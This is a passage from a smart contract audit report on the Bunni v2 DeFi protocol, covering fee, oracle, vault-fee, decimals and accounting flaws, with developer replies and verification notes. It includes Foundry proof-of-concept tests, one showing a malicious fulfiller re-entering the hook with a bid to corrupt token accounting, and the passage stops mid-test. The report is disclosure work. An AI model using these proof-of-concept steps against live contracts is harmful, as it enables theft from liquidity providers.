In case of exact output swaps when the surge fee is near 100%, users can be overcharged:
```solidity
        } else {
            // compute the swap fee and the hook fee (i.e. protocol fee)
            // swap fee is taken by increasing the input amount
            // need to modify fee rate to maintain the same average price as exactIn case
            // in / (out * (1 - fee)) = in * (1 + fee') / out => fee' = fee / (1 - fee)
@>          swapFeeAmount = inputAmount.mulDivUp(swapFee, SWAP_FEE_BASE - swapFee);
            if (useAmAmmFee) {
                // instead of computing hook fees as a portion of the swap fee
                // and deducting it, we compute hook fees separately using hookFeesBaseSwapFee
                // and charge it as an extra fee on the swap
@>              hookFeesAmount = inputAmount.mulDivUp(hookFeesBaseSwapFee, SWAP_FEE_BASE - hookFeesBaseSwapFee).mulDivUp(
                    env.hookFeeModifier, MODIFIER_BASE
                );
            } else {
                hookFeesAmount = swapFeeAmount.mulDivUp(env.hookFeeModifier, MODIFIER_BASE);
                swapFeeAmount -= hookFeesAmount;
            }

            // set the am-AMM fee to be the swap fee amount
            // don't need to check if am-AMM is enabled since if it isn't
            // BunniHook.beforeSwap() simply ignores the returned values
            // this saves gas by avoiding an if statement
            (amAmmFeeCurrency, amAmmFeeAmount) = (inputToken, swapFeeAmount);

            // modify input amount with fees
@>          inputAmount += swapFeeAmount + hookFeesAmount;
```

**Impact:** When am-AMM management is enabled and the surge fee approaches 100%, the total swap fee amount `swapFeeAmount + hookFeesAmount` can exceed the output amount, resulting in an unexpected revert. Additionally, users can be overcharged for exact output swaps when the surge fee is near 100%.

**Recommended Mitigation:** Consider deducting `hookFeesAmount` from the surge fee to ensure that the total swap fee amount is capped at 100% and will be correctly decreased from 100%.

**Bacon Labs:** Fixed in [PR \#123](https://github.com/timeless-fi/bunni-v2/pull/123). We acknowledge the issue with potentially overcharging swappers during exact output swaps, were okay with it since we prefer benefitting LPs.

**Cyfrin:** Verified, the case wherefee sum exceeds the output amountis now explicitly handled inBunniHookLogic::beforeSwap, deducting from the am-Amm/dynamic swap fee such that the hook fee is always consistent.


### `OracleUniGeoDistribution` oracle tick validation is flawed

**Description:** `OracleUniGeoDistribution::floorPriceToRick` computes the rounded tick to which the given bond token floor price corresponds:

```solidity
function floorPriceToRick(uint256 floorPriceWad, int24 tickSpacing) public view returns (int24 rick) {
    // convert floor price to sqrt price
    // assume bond is currency0, floor price's unit is (currency1 / currency0)
    // unscale by WAD then rescale by 2**(96*2), then take the sqrt to get sqrt(floorPrice) * 2**96
    uint160 sqrtPriceX96 = ((floorPriceWad << 192) / WAD).sqrt().toUint160();

    // convert sqrt price to rick
    rick = sqrtPriceX96.getTickAtSqrtPrice();
    rick = bondLtStablecoin ? rick : -rick; // need to invert the sqrt price if bond is currency1
    rick = roundTickSingle(rick, tickSpacing);
}
```

This function is called within `OracleUniGeoDistribution::isValidParams`:

```solidity
    function isValidParams(PoolKey calldata key, uint24, /* twapSecondsAgo */ bytes32 ldfParams)
        public
        view
        override
        returns (bool)
    {
        // only allow the bond-stablecoin pairing
        (Currency currency0, Currency currency1) = bond < stablecoin ? (bond, stablecoin) : (stablecoin, bond);

        return LibOracleUniGeoDistribution.isValidParams(
@>          key.tickSpacing, ldfParams, floorPriceToRick(oracle.getFloorPrice(), key.tickSpacing)
        ) && key.currency0 == currency0 && key.currency1 == currency1;
    }
```

And validation of the resulting oracle rick, which informs the `tickLower/Upper`, is performed within `LibOracleUniGeoDistribution::isValidParams` where the `oracleTickOffset` is also applied:

```solidity
    function isValidParams(int24 tickSpacing, bytes32 ldfParams, int24 oracleTick) internal pure returns (bool) {
        // decode params
        // | shiftMode - 1 byte | distributionType - 1 byte | oracleIsTickLower - 1 byte | oracleTickOffset - 2 bytes | nonOracleTick - 3 bytes | alpha - 4 bytes |
        uint8 shiftMode = uint8(bytes1(ldfParams));
        uint8 distributionType = uint8(bytes1(ldfParams << 8));
        bool oracleIsTickLower = uint8(bytes1(ldfParams << 16)) != 0;
        int24 oracleTickOffset = int24(int16(uint16(bytes2(ldfParams << 24))));
        int24 nonOracleTick = int24(uint24(bytes3(ldfParams << 40)));
        uint32 alpha = uint32(bytes4(ldfParams << 64));

@>      oracleTick += oracleTickOffset; // apply offset to oracle tick
@>      (int24 tickLower, int24 tickUpper) =
            oracleIsTickLower ? (oracleTick, nonOracleTick) : (nonOracleTick, oracleTick);
        if (tickLower >= tickUpper) {
            // ensure tickLower < tickUpper
            // use the non oracle tick as the bound
            // LDF needs to be at least one tickSpacing wide
            (tickLower, tickUpper) =
                oracleIsTickLower ? (tickUpper - tickSpacing, tickUpper) : (tickLower, tickLower + tickSpacing);
        }

        bytes32 geometricLdfParams =
        bytes32(abi.encodePacked(shiftMode, tickLower, int16((tickUpper - tickLower) / tickSpacing), alpha));

        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));

        // validity conditions:
        // - geometric LDF params are valid
        // - uniform LDF params are valid
        // - shiftMode is static
        // - distributionType is valid
        // - oracleTickOffset is aligned to tickSpacing
        // - nonOracleTick is aligned to tickSpacing
        return LibGeometricDistribution.isValidParams(tickSpacing, 0, geometricLdfParams)
            && tickLower % tickSpacing == 0 && tickUpper % tickSpacing == 0 && tickLower >= minUsableTick
            && tickUpper <= maxUsableTick && shiftMode == uint8(ShiftMode.STATIC)
            && distributionType <= uint8(type(DistributionType).max) && oracleTickOffset % tickSpacing == 0
            && nonOracleTick % tickSpacing == 0;
    }
```

However, none of this validation is performed in the other invocations of `floorPriceToRick()`, for example in `OracleUniGeoDistribution::query`, so the min/max usable tick validation could be violated if `oracle.getFloorPrice()` returns a different value. Currently, when the oracle returns a different price it simply triggers the surge logic without any further validation:

```solidity
if (initialized) {
    // should surge if param was updated or oracle rick has updated
    shouldSurge = lastLdfParams != ldfParams || oracleRick != lastOracleRick;
}
```

Note that given the oracle tick offset is applied to the oracle tick and the subsequent `tickLower/Upper` are enforced to be aligned to the tick spacing, it is not necessary to additionally enforce that the oracle tick offset is aligned because the tick is already rounded to a rick in `floorPriceToRick()`.

**Impact:** Validation on the oracle tick is not be performed in invocations of `floorPriceToRick()` within `query()`, `computeSwap()`, or `cumulativeAmount0/1()`. If the oracle reports a floor price that is outside of the min/max usable ticks then execution could proceed in the ranges `[MIN_TICK, minUsableTick]` and `[maxUsableTick, MAX_TICK]`.

**Recommended Mitigation:** Add validation to `LibOracleUniGeoDistribution::decodeParams` to ensure that, in the event that the floor price changes, the ticks calculated using the oracle rick are contained within the usable range of ticks.

**Bacon Labs:** Fixed in [PR \#97](https://github.com/timeless-fi/bunni-v2/pull/97).

**Cyfrin:** Verified, `OracleUniGeoDistribution` now bounds the tick ranges by the minimum and maximum usable ticks in `LibOracleUniGeoDistribution::decodeParams` such that validation is applied to usage in other `floorPriceToRick()` invocations.


### `BunniHook::beforeSwap` does not account for vault fees paid when adjusting raw token balances which could result in small losses to liquidity providers

**Description:** Unlike during pool deposits, `BunniHook::beforeSwap` does not charge an additional fee on swaps that result in input tokens being moved to/from vaults that charge a fee on such operations. The `BunniHub` handles swaps via the `hookHandleSwap()` function which checks whether tokens should be deposited into the specified vault. When the `rawBalance` exceeds the `maxRawBalance`, a portion is deposited into the vault in an attempt to reach the `targetRawBalance` value. Any non-zero vault fee will be charged from the deposited amount, silently decreasing the pool's balances which proportionally belong to the liquidity providers:

```solidity
    function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
@>      uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

@>      if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
            (int256 reserveChange, int256 rawBalanceChange) =
@>              _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }
```

Additionally, since the swap could trigger a rebalance if the liquidity distribution is to be shifted, some of these excess funds could be used to execute the rebalance rather than unnecessarily paying the vault fee only to withdraw again when the rebalance is executed.

When a user deposits to a pool that already has an initialized liquidity shape, the current `BunniHubLogic::_depositLogic` simply adds tokens at the current reserve/raw balance ratio, ignoring the target ratio. As such, the closer these balances are to the maximum raw balance then the fewer tokens will be deposited to the reserve by the caller, since in these lines the division will be smaller:

```solidity
returnData.reserveAmount0 = balance0 == 0 ? 0 : returnData.amount0.mulDiv(reserveBalance0, balance0);
returnData.reserveAmount1 = balance1 == 0 ? 0 : returnData.amount1.mulDiv(reserveBalance1, balance1);
```

Then, when there is a swap that causes the maximum raw balance to be exceeded, the pool attempts to reach the target ratio by depositing into the vault; however, the presence of a non-zero vault fee causes liquidity providers to overpay. Since the previous deposits to the vault reserve were not made with the target ratio, this proportional fee amount will be slightly larger when it is paid during the swap compared to if it had been paid by the original caller.

**Impact:** Vault fees during swaps can be paid by the pool liquidity, causing a small loss to liquidity providers; however, it does not appear to be easily triggered by a malicious user to repeatedly cause the `BunniHub` to deposit funds to the vault in order to make LPs pay for the vault fee, since this occurs only when the raw balance exceeds the maximum amount and execution of swaps which will involve paying swap fees are required to unbalance the raw token ratios.

**Recommended Mitigation:** Consider:
* Charging vaults fees from the input amount proportional to the target ratio. For the exact-in cases, the vault fee should be deducted at the start of the swap logic, and for the exact-out cases at the end of the swap logic.
* Depositing reserves in the target proportion instead of using the current rate. If depositing into the vault is not possible, the logic should charge the appropriate fee as if the target proportion was used.

**Bacon Labs:** Fixed in [PR \#124](https://github.com/timeless-fi/bunni-v2/pull/124). We did not add the suggested change to charge vault fees from swaps due to the required solution being too complicated to be worth it.

**Cyfrin:** Verified, the target raw token ratio is now always used during deposit and updates only occur when there will not be a subsequent rebalance.


### Incorrect bond/stablecoin pair decimals assumptions in `OracleUniGeoDistribution`

**Description:** The `OracleUniGeoDistribution` intends to compute a geometric or uniform distribution with two limits; one is arbitrarily set by the owner, and the other is derived from an external price oracle. The price of the bond is returned in terms of USD in 18 decimals before it is converted to a `sqrtPriceX96` by `OracleUniGeoDistribution::floorPriceToRick` which unscales the WAD (18 decimal) precision:

```solidity
function floorPriceToRick(uint256 floorPriceWad, int24 tickSpacing) public view returns (int24 rick) {
    // convert floor price to sqrt price
    // assume bond is currency0, floor price's unit is (currency1 / currency0)
    // unscale by WAD then rescale by 2**(96*2), then take the sqrt to get sqrt(floorPrice) * 2**96
    uint160 sqrtPriceX96 = ((floorPriceWad << 192) / WAD).sqrt().toUint160();
    // convert sqrt price to rick
    rick = sqrtPriceX96.getTickAtSqrtPrice();
    rick = bondLtStablecoin ? rick : -rick; // need to invert the sqrt price if bond is currency1
    rick = roundTickSingle(rick, tickSpacing);
}
```

This computation assumes that both the bond and the stablecoin will have the same number of decimals; however, consider the following example:

* Assuming the bond is valued at exactly 1 USD, the price oracle will return `1e18` and the `sqrtPriceX96` will be computed with `1` based on a 1:1 ratio.
* This is well implemented so long as both currencies have the same number of decimals because it will match the ratio. Assume that the bond has 18 decimals and the stablecoin is DAI, also with 18 decimals.
* The price will be `1e18 / 1e18 = 1`, so the tick will be properly computed.
* On the other hand, if the bond is paired with a stablecoin with a different number of decimals, the computed tick will be wrong. In the case of USDC, the price would be `1e18 / 1e6 = 1e12`. This tick value differs significantly from the actual value that should have been computed.

**Impact:** Bonds paired with stablecoins with a differing number of decimals will be affected, computing incorrect limits for the LDF.

**Proof of Concept:** Consider the following real examples:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

interface IUniswapV3PoolState {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );
}

contract DecimalsPoC is BaseTest {
    function setUp() public override {
        super.setUp();
    }

    function test_slot0PoC() public {
        uint256 mainnetFork;
        string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        mainnetFork = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnetFork);

        address DAI_WETH = 0xa80964C5bBd1A0E95777094420555fead1A26c1e;
        address USDC_WETH = 0x7BeA39867e4169DBe237d55C8242a8f2fcDcc387;

        (uint160 sqrtPriceX96DAI,,,,,,) = IUniswapV3PoolState(DAI_WETH).slot0();
        (uint160 sqrtPriceX96USDC,,,,,,) = IUniswapV3PoolState(USDC_WETH).slot0();

        console2.log("sqrtPriceX96DAI: %s", sqrtPriceX96DAI);
        console2.log("sqrtPriceX96USDC: %s", sqrtPriceX96USDC);
    }
}
```

Output:
```bash
Ran 1 test for test/DecimalsPoC.t.sol:DecimalsPoC
[PASS] test_slot0PoC() (gas: 20679)
Logs:
  sqrtPriceX96DAI: 1611883263726799730515701216
  sqrtPriceX96USDC: 1618353216855286506291652802704389

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.30s (2.78s CPU time)

Ran 1 test suite in 4.45s (3.30s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As can be observed from the logs, there is a significant difference in the sqrt price that would be translated into a large tick difference between these two token ratios.

**Recommended Mitigation:** Any difference in decimals between the bond and stablecoin should be factored into the calculation of the sqrt price after unscaling by WAD and before rescaling by `2**(96*2)`.

**Bacon Labs:** Acknowledged, were okay with assuming that the bond & the stablecoin will have the same decimals.

**Cyfrin:** Acknowledged.


### Collision between rebalance order consideration tokens and am-AMM fees for Bunni pools using Bunni tokens

**Description:** `AmAmm` rent for a given Bunni pool is paid and stored in the `BunniHook` as the ERC-20 representation of its corresponding Bunni token. For pools comprised of at least one underlying Bunni token, there can be issues in the `BunniHook` accounting due to a collision in certain edge cases between the ERC-20 balances. Specifically, a malicious fulfiller who performs an am-AMM bid during the `IFulfiller::sourceConsideration` callback can force additional Bunni token to be accounted to the hook from the hub than should be possible due to inflation of the `orderOutputAmount` state.

```solidity
    /* pre-hook: cache output balance */
    // store the order output balance before the order execution in transient storage
    // this is used to compute the order output amount
    uint256 outputBalanceBefore = hookArgs.postHookArgs.currency.isAddressZero()
        ? weth.balanceOf(address(this))
        : hookArgs.postHookArgs.currency.balanceOfSelf();
    assembly ("memory-safe") {
@>      tstore(REBALANCE_OUTPUT_BALANCE_SLOT, outputBalanceBefore)
    }

    /* am-amm bid is performed during sourceConsideration */

    /* post-hook: compute order output amount by deducting cached balance from current balance (doesn't account for am-amm rent */
    // compute order output amount by computing the difference in the output token balance
    uint256 orderOutputAmount;
    uint256 outputBalanceBefore;
    assembly ("memory-safe") {
@>      outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
    }
    if (args.currency.isAddressZero()) {
        // unwrap WETH output to native ETH
        orderOutputAmount = weth.balanceOf(address(this));
        weth.withdraw(orderOutputAmount);
    } else {
@>      orderOutputAmount = args.currency.balanceOfSelf();
    }
@>  orderOutputAmount -= outputBalanceBefore;
```

**Impact:** Core accounting can be broken due to re-entrant actions taken in the `BunniHook` during rebalance order fulfilment.

**Proof of Concept:** The following tests demonstrate how this incorrect accounting assumption can result in incorrect behavior:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";
import "./mocks/BasicBunniRebalancer.sol";

import "flood-contracts/src/interfaces/IFloodPlain.sol";

contract RebalanceWithBunniLiqTest is BaseTest {
    BasicBunniRebalancer public rebalancer;

    function setUp() public override {
        super.setUp();

        rebalancer = new BasicBunniRebalancer(poolManager, floodPlain);
        zone.setIsWhitelisted(address(rebalancer), true);
    }

    function test_rebalance_withBunniLiq() public {
        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA));
        ldf_.setMinTick(-30);

        (, PoolKey memory key) = _deployPoolAndInitLiquidity(ldf_, ldfParams);

        // shift liquidity to the right
        // the LDF will demand more token0, so we'll have too much of token1
        ldf_.setMinTick(-20);

        // make swap to trigger rebalance
        uint256 swapAmount = 1e6;
        _mint(key.currency0, address(this), swapAmount);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: true,
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        vm.recordLogs();
        _swap(key, params, 0, "");

        IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
        (uint256 balanceBefore, bool isToken0Before) = idleBalanceBefore.fromIdleBalance();
        assertGt(balanceBefore, 0, "idle balance should be non-zero");
        assertFalse(isToken0Before, "idle balance should be in token1");

        // obtain the order from the logs
        Vm.Log[] memory logs_ = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs_.length; i++) {
            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs_[i];
                break;
            }
        }
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));

        // wait for the surge fee to go down
        skip(9 minutes);

        // fulfill order using rebalancer
        rebalancer.rebalance(signedOrder, key);

        // rebalancer should have profits in token1
        assertGt(token1.balanceOf(address(rebalancer)), 0, "rebalancer should have profits");
    }

    function test_outputExcessiveBidTokensDuringRebalanceAndRefund() public {
        // Step 1: Create a new pool
        (IBunniToken bt1, PoolKey memory poolKey1) = _deployPoolAndInitLiquidity();

        // Step 2: Send bids and rent tokens (BT1) to BunniHook
        uint128 minRent = uint128(bt1.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
        uint128 bidAmount = minRent * 10 days;
        address alice = makeAddr("Alice");
        deal(address(bt1), address(this), bidAmount);
        bt1.approve(address(bunniHook), bidAmount);
        bunniHook.bid(
            poolKey1.toId(), address(alice), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent, bidAmount
        );

        // Step 3: Create a new pool with BT1 and token2
        ERC20Mock token2 = new ERC20Mock();
        MockLDF mockLDF = new MockLDF(address(hub), address(bunniHook), address(quoter));
        mockLDF.setMinTick(-30); // minTick of MockLDFs need initialization

        // approve tokens
        vm.startPrank(address(0x6969));
        bt1.approve(address(PERMIT2), type(uint256).max);
        token2.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(bt1), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token2), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        (Currency currency0, Currency currency1) = address(bt1) < address(token2)
            ? (Currency.wrap(address(bt1)), Currency.wrap(address(token2)))
            : (Currency.wrap(address(token2)), Currency.wrap(address(bt1)));
        (, PoolKey memory poolKey2) = _deployPoolAndInitLiquidity(
            currency0,
            currency1,
            ERC4626(address(0)),
            ERC4626(address(0)),
            mockLDF,
            IHooklet(address(0)),
            bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            bytes32(uint256(1))
        );

        // Step 4: Trigger a rebalance for the recursive pool
        // Shift liquidity to create an imbalance such that we need to swap token2 into bt1
        // Shift right if bt1 is token0, shift left if bt1 is token1
        mockLDF.setMinTick(address(bt1) < address(token2) ? -20 : -40);

        // Make a small swap to trigger rebalance
        uint256 swapAmount = 1e6;
        deal(address(bt1), address(this), swapAmount);
        bt1.approve(address(swapper), swapAmount);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: address(bt1) < address(token2),
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: address(bt1) < address(token2) ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
        });

        // Record logs to capture the OrderEtched event
        vm.recordLogs();
        swapper.swap(poolKey2, params, type(uint256).max, 0);

        // Find the OrderEtched event
        Vm.Log[] memory logs_ = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs_.length; i++) {
            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs_[i];
                break;
            }
        }
        require(orderEtchedLog.emitter == address(floodPlain), "OrderEtched event not found");

        // Decode the order from the event
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
        IFloodPlain.Order memory order = signedOrder.order;
        assertEq(order.offer[0].token, address(token2), "Order offer token should be token2");
        assertEq(order.consideration.token, address(bt1), "Order consideration token should be BT1");

        // Step 5: Prepare to fulfill order and slightly increase bid during source consideration
        uint256 bunniHookBalanceBefore = bt1.balanceOf(address(bunniHook));
        console2.log("BunniHook BT1 balance before rebalance:", bt1.balanceOf(address(bunniHook)));
        console2.log(
            "BunniHub BT1 6909 balance before rebalance:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
        );

        console2.log("BunniHook token2 balance before rebalance:", token2.balanceOf(address(bunniHook)));
        console2.log(
            "BunniHub token2 6909 balance before rebalance:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
        );

        // slightly exceed the bid amount
        uint128 minRent1 = minRent * 1.11e18 / 1e18;
        uint128 bidAmount1 = minRent1 * 10 days;
        assertEq(bidAmount1 % minRent1, 0, "bidAmount1 should be a multiple of minRent");
        deal(address(bt1), address(this), order.consideration.amount + bidAmount1);
        bt1.approve(address(floodPlain), order.consideration.amount);
        bt1.approve(address(bunniHook), bidAmount1);

        console2.log("address(this) bt1 balance before rebalance:", bt1.balanceOf(address(this)));

        // Fulfill the rebalance order
        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(true, bunniHook, poolKey1, minRent1, bidAmount1));

        // alice exceeds the bid amount again
        uint128 mintRent2 = minRent1 * 1.11e18 / 1e18;
        uint128 bidAmount2 = mintRent2 * 10 days;
        deal(address(bt1), address(this), bidAmount2);
        bt1.approve(address(bunniHook), bidAmount2);
        bunniHook.bid(poolKey1.toId(), alice, bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), mintRent2, bidAmount2);

        // make a claim
        bunniHook.claimRefund(poolKey1.toId(), address(this));

        console2.log("BunniHook BT1 balance after rebalance and refund:", bt1.balanceOf(address(bunniHook)));
        console2.log("BunniHook token2 balance after rebalance and refund:", token2.balanceOf(address(bunniHook)));

        console2.log(
            "BunniHub BT1 6909 balance after rebalance and refund:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
        );
        console2.log(
            "BunniHub token2 6909 balance after rebalance and refund:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
        );

        console2.log("address(this) BT1 balance after refund:", bt1.balanceOf(address(this)));
        console2.log("address(this) token2 balance after refund:", token2.balanceOf(address(this)));

        console2.log(
            "address(this) gained BT1 balance after rebalance and refund:",
            bt1.balanceOf(address(address(this))) - bidAmount1
        ); // consideration amount was swapped for token2
        console2.log(
            "BunniHook gained BT1 balance after rebalance and refund:",
            bt1.balanceOf(address(bunniHook)) - bunniHookBalanceBefore
        );
    }

    // Implementation of IFulfiller interface
    function sourceConsideration(
        bytes28, /* selectorExtension */
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata data
    ) external returns (uint256) {
        bool isFirst = abi.decode(data[:32], (bool));
        bytes memory context = data[32:];

        if (isFirst) {
            (BunniHook bunniHook, PoolKey memory poolKey1, uint128 rent, uint128 bid) =
                abi.decode(context, (BunniHook, PoolKey, uint128, uint128));

            console2.log(
                "BunniHook BT1 balance before bid in sourceConsideration:",
                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
            );

            bunniHook.bid(poolKey1.toId(), address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), rent, bid);

            console2.log(
                "BunniHook BT1 balance after bid in sourceConsideration:",
                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
            );
        } else {
            (bytes32 poolId, address bunniToken) = abi.decode(context, (bytes32, address));
            IERC20(order.consideration.token).approve(msg.sender, order.consideration.amount);
            uint128 minRent = uint128(IERC20(bunniToken).totalSupply() * 1e10 / 1e18);
            uint128 deposit = uint128(7200 * minRent);
            IERC20(order.consideration.token).approve(address(bunniHook), uint256(deposit));
            bunniHook.bid(PoolId.wrap(poolId), address(this), bytes6(0), minRent, deposit);
            return order.consideration.amount;
        }

        return order.consideration.amount;
    }

    function test_normalBidding() external {
        (IBunniToken bt1, PoolKey memory poolKey1) =
            _deployPoolAndInitLiquidity(Currency.wrap(address(token0)), Currency.wrap(address(token1)));
        deal(address(bt1), address(this), 100e18);
        uint128 minRent = uint128(IERC20(bt1).totalSupply() * 1e10 / 1e18);
        uint128 deposit = uint128(7200 * minRent);
        IERC20(address(bt1)).approve(address(bunniHook), uint256(deposit));
        bunniHook.bid(poolKey1.toId(), address(this), bytes6(0), minRent, deposit);
    }

    function test_doubleBunniTokenAccountingRevert() external {
        // swapAmount = bound(swapAmount, 1e6, 1e9);
        // feeMin = uint24(bound(feeMin, 2e5, 1e6 - 1));
        // feeMax = uint24(bound(feeMax, feeMin, 1e6 - 1));
        // alpha = uint32(bound(alpha, 1e3, 12e8));
        uint256 swapAmount = 496578468;
        uint24 feeMin = 800071;
        uint24 feeMax = 996693;
        uint32 alpha = 61123954;
        bool zeroForOne = true;
        uint24 feeQuadraticMultiplier = 18;

        uint256 counter;
        IBunniToken bt1 = IBunniToken(address(0));
        PoolKey memory poolKey1;
        while (address(bt1) < address(token0)) {
            (bt1, poolKey1) = _deployPoolAndInitLiquidity(
                Currency.wrap(address(token0)),
                Currency.wrap(address(token1)),
                bytes32(keccak256(abi.encode(counter++)))
            );
        }

        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), alpha));
        {
            PoolKey memory key_;
            key_.tickSpacing = TICK_SPACING;
            vm.assume(ldf_.isValidParams(key_, TWAP_SECONDS_AGO, ldfParams, LDFType.DYNAMIC_AND_STATEFUL));
        }
        ldf_.setMinTick(-30); // minTick of MockLDFs need initialization
        vm.startPrank(address(0x6969));
        IERC20(address(bt1)).approve(address(hub), type(uint256).max);
        IERC20(address(token0)).approve(address(hub), type(uint256).max);
        vm.stopPrank();
        (, PoolKey memory key) = _deployPoolAndInitLiquidity(
            Currency.wrap(address(token0)),
            Currency.wrap(address(bt1)),
            ERC4626(address(0)),
            ERC4626(address(0)),
            ldf_,
            IHooklet(address(0)),
            ldfParams,
            abi.encodePacked(
                feeMin,
                feeMax,
                feeQuadraticMultiplier,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            bytes32(keccak256("random")) // salt
        );

        // shift liquidity based on direction
        // for zeroForOne: shift left, LDF will demand more token1, so we'll have too much of token0
        // for oneForZero: shift right, LDF will demand more token0, so we'll have too much of token1
        ldf_.setMinTick(zeroForOne ? -40 : -20);

        // Define currencyIn and currencyOut based on direction
        Currency currencyIn = zeroForOne ? key.currency0 : key.currency1;
        Currency currencyOut = zeroForOne ? key.currency1 : key.currency0;
        Currency currencyInRaw = zeroForOne ? key.currency0 : key.currency1;
        Currency currencyOutRaw = zeroForOne ? key.currency1 : key.currency0;

        // make small swap to trigger rebalance
        _mint(key.currency0, address(this), swapAmount);
        vm.prank(address(this));
        IERC20(Currency.unwrap(key.currency0)).approve(address(swapper), type(uint256).max);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: zeroForOne,
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        vm.recordLogs();
        _swap(key, params, 0, "");

        // validate etched order
        Vm.Log[] memory logs = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(floodPlain) && logs[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs[i];
                break;
            }
        }
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
        IFloodPlain.Order memory order = signedOrder.order;

        // if there is no weth held in the contract, the rebalancing succeeds
        _mint(currencyOut, address(this), order.consideration.amount * 2);
